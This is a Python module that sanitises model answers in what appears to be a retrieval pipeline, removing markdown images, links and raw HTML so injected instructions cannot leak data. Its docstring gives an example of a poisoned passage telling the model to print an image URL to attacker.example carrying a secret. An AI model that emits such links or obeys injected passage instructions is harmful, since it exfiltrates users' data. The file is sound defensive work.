"""Answer sanitising: remove the channels an injected instruction could use to exfiltrate data.

A poisoned passage can tell the model to print `![x](https://attacker.example/?d=<secret>)`; a
markdown renderer then fetches that URL. Our answers need citations like [1], never links or images:

  * `![alt](url)`        removed entirely
  * `[text](url)`        becomes `text` (the URL is dropped)
  * `[text]`             becomes `text`, unless it is a numeric citation ([1], [2, 3]) or one of our
                         own PII placeholders ([EMAIL]); this also defeats reference-style links,
                         `![a][ref]` plus `[ref]: https://...`, without parsing definitions
  * `<tag ...>`          removed (raw HTML, autolinks)

Brackets nest (`![a [b]](url)` is valid markdown), so they are tracked by depth.
`StreamSanitizer` works on a token stream, where a construct can be split across pieces;
`sanitize_output` applies the same machine to a whole string.
"""

import re

MAX_BRACKET = 200  # a longer "label" is not a citation or link text: stop treating it as one
MAX_TAG = 300
MAX_URL = 4000
KEEP_LABEL = re.compile(r"^(?:\d+(?:\s*,\s*\d+)*|EMAIL|IBAN|CARD|PHONE|IP)$")

NORMAL, BANG, BRACKET, AFTER, URL, TAG = range(6)


class StreamSanitizer:
    def __init__(self) -> None:
        self._reset()

    def _reset(self) -> None:
        self._state = NORMAL
        self._image = False
        self._label = ""  # text between the outer [ and ]
        self._raw = ""  # raw text of the construct in progress, emitted if it proves harmless
        self._depth = 0
        self._rendered = ""  # what the construct becomes once its URL (if any) is dropped
        self._url_len = 0

    def feed(self, piece: str) -> str:
        return "".join(self._step(ch) for ch in piece)

    def flush(self) -> str:
        """End of stream. An unfinished URL or tag is dropped; other held text is emitted."""
        state, raw = self._state, self._raw
        self._reset()
        return "" if state in (URL, TAG) else raw

    def _release(self, ch: str) -> str:
        """The construct in progress turned out not to be one: emit it raw, then handle `ch`."""
        raw = self._raw
        self._reset()
        return raw + self._normal(ch)

    def _normal(self, ch: str) -> str:
        if ch == "!":
            self._state, self._raw = BANG, "!"
            return ""
        if ch == "[":
            self._open_bracket(image=False)
            return ""
        if ch == "<":
            self._state, self._raw = TAG, "<"
            return ""
        return ch

    def _open_bracket(self, image: bool) -> None:
        self._state, self._image, self._label, self._depth = BRACKET, image, "", 0
        self._raw = "![" if image else "["

    def _step(self, ch: str) -> str:
        s = self._state
        if s == NORMAL:
            return self._normal(ch)
        if s == BANG:
            if ch == "[":
                self._open_bracket(image=True)
                return ""
            return self._release(ch)
        if s == BRACKET:
            if ch == "\n" or len(self._label) >= MAX_BRACKET:
                return self._release(ch)
            if ch == "[":
                self._depth += 1
            elif ch == "]":
                if self._depth == 0:
                    keep = KEEP_LABEL.match(self._label) is not None
                    self._rendered = (
                        "" if self._image else (f"[{self._label}]" if keep else self._label)
                    )
                    self._state = AFTER
                    return ""
                self._depth -= 1
            self._label += ch
            self._raw += ch
            return ""
        if s == AFTER:
            if ch == "(":
                self._state, self._url_len = URL, 0
                return ""
            rendered = self._rendered
            self._reset()
            return rendered + self._normal(ch)
        if s == URL:
            self._url_len += 1
            if ch == ")":
                rendered = self._rendered
                self._reset()
                return rendered
            if self._url_len > MAX_URL:  # runaway: give up on this construct
                self._reset()
            return ""
        # TAG: raw HTML such as <img ...>, <a ...>, <https://...>
        if ch == ">":
            tag = self._raw + ">"
            self._reset()
            return "" if (tag[1:2].isalpha() or tag[1:2] == "/") else tag
        if ch == "<" or len(self._raw) >= MAX_TAG:
            return self._release(ch)
        self._raw += ch
        if len(self._raw) == 2 and not (ch.isalpha() or ch == "/"):
            return self._release("")  # "< " or "<3": not a tag
        return ""


def sanitize_output(text: str) -> str:
    san = StreamSanitizer()
    return san.feed(text) + san.flush()
